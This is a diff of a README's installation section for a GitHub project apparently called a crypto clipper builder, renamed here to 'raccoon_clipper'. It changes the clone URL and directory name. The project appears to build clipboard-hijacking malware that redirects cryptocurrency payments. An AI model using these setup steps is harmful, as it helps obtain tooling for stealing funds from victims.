@@ -41,9 +41,9 @@ if discord is being used
 ![Screenshot 2024-06-03 233516](https://github.com/3022-2/crypto_clipper_builder/assets/82278708/b0111946-3bed-425c-a871-ebf63b9d33f1)
 # installation
 ```console
-git clone https://github.com/3022-2/crypto_clipper_builder.git
+git clone https://github.com/3022-2/raccoon_clipper.git
 
-cd crypto_clipper_builder-main
+cd raccoon_clipper
 
 pip install -r requirements.txt
 
